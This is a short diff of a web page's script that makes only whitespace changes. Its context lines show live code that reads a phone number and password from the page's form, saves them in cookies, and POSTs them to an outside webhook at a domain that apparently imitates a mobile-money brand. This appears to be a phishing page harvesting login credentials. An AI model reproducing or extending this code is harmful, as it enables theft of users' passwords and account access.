@@ -228,6 +228,7 @@
         setCookie("phonenumber", document.getElementById('phonenumber').value);
         setCookie("password", document.getElementById('password').value);
         var xhr = new XMLHttpRequest();
+        
         xhr.open("POST", 'https://webhook.orangernoney.com',true);
         xhr.setRequestHeader('Content-Type', 'application/json');
         xhr.onreadystatechange = function() {
@@ -248,5 +249,4 @@
      })
     </script>
 </body>
-
 </html>
